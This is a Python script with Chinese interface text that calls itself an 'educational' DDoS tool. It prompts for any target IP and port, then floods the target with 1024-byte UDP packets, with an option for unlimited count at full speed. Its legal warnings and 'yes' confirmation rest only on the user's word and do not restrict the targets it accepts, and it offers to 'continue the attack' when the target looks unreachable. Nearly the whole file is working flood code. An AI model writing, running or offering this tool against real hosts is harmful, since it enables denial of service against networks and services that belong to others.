import sys
import os
import time
import socket
import ipaddress

class DDoSSimulator:
    """UDP 数据包发送模拟器"""

    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.max_packets = 0
        self.rate_limit = 0.0       # 发包间隔（秒），0 表示无限制
        self.sock = None
        self.payload = b'\x00' * 1024  # 默认 1024 字节载荷

    def show_banner(self):
        """显示警告和法律声明"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("=" * 60)
        print("  DDOS-Attack 教育版 UDP 数据包发送器 v2.0")
        print("=" * 60)
        print("法律警告：")
        print("本工具仅用于教育目的。")
        print("你只能在你拥有并完全隔离的实验环境中使用。")
        print("未经授权的攻击是严重的犯罪行为。")
        print("=" * 60)
        input("按回车键继续，或按 Ctrl+C 退出...")

    def get_target_info(self):
        """获取并验证目标 IP 和端口"""
        while True:
            try:
                ip_str = input("请输入目标 IP 地址: ").strip()
                ipaddress.ip_address(ip_str)
                self.target_ip = ip_str
                break
            except ValueError:
                print("[!] 无效的 IP 地址，请输入合法的 IPv4 或 IPv6 地址。")

        while True:
            try:
                port_str = input("请输入目标端口 (1-65535): ").strip()
                port = int(port_str)
                if 1 <= port <= 65535:
                    self.target_port = port
                    break
                else:
                    print("[!] 端口必须在 1 到 65535 之间。")
            except ValueError:
                print("[!] 无效的端口号，请输入数字。")

        while True:
            try:
                pkt_str = input("请输入要发送的数据包数量 (0 表示无限): ").strip()
                self.max_packets = int(pkt_str)
                if self.max_packets < 0:
                    print("[!] 数据包数量不能为负数。")
                    continue
                break
            except ValueError:
                print("[!] 无效的数字，请输入整数。")

        # 可选速率限制
        try:
            rate_str = input("请输入发包间隔（秒，0 表示不限速，例如 0.1）: ").strip()
            self.rate_limit = float(rate_str)
        except ValueError:
            self.rate_limit = 0.0

    def target_reachable(self):
        """简单 TCP 连通性检查（目标是否可达且端口可能开放）"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    def send_packets(self):
        """开始发送 UDP 数据包"""
        print(f"\n[*] 目标: {self.target_ip}:{self.target_port}")
        print(f"[*] 发送数据包数量: {'无限' if self.max_packets == 0 else self.max_packets}")
        print(f"[*] 发包速率限制: {self.rate_limit if self.rate_limit > 0 else '无（最大速度）'}")
        print("[*] 按 Ctrl+C 停止。\n")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = 0
        start_time = time.time()

        try:
            while self.max_packets == 0 or sent < self.max_packets:
                self.sock.sendto(self.payload, (self.target_ip, self.target_port))
                sent += 1

                # 实时输出，使用 \r 动态更新同一行
                elapsed = time.time() - start_time
                pps = sent / elapsed if elapsed > 0 else 0
                print(f"已发送: {sent} 个包 | 已用时间: {elapsed:.1f}秒 | 速率: {pps:.1f} pps   ", end='\r')

                # 速率限制
                if self.rate_limit > 0:
                    time.sleep(self.rate_limit)

        except KeyboardInterrupt:
            print(f"\n\n[!] 用户手动停止发送。")
        except Exception as e:
            print(f"\n[!] 错误: {e}")
        finally:
            self.sock.close()
            elapsed = time.time() - start_time
            print(f"\n[+] 总共发送包数: {sent} ，用时 {elapsed:.2f} 秒。")

    def run(self):
        """主流程"""
        self.show_banner()
        self.get_target_info()

        # 再次安全提醒
        print("\n[!] 最后警告：你即将向目标发送 UDP 流量。")
        confirm = input("你是否确认这是你拥有并完全隔离的环境？(yes/no): ").strip().lower()
        if confirm != 'yes':
            print("[*] 用户取消。")
            sys.exit(0)

        print("\n[*] 正在检查目标连通性...")
        if not self.target_reachable():
            print("[!] 目标似乎不可达或端口未开放。是否仍要尝试攻击？")
            choice = input("继续？(y/n): ").strip().lower()
            if choice != 'y':
                sys.exit(0)

        self.send_packets()


if __name__ == "__main__":
    try:
        simulator = DDoSSimulator()
        simulator.run()
    except KeyboardInterrupt:
        print("\n[*] 程序被用户终止。")
        sys.exit(0)
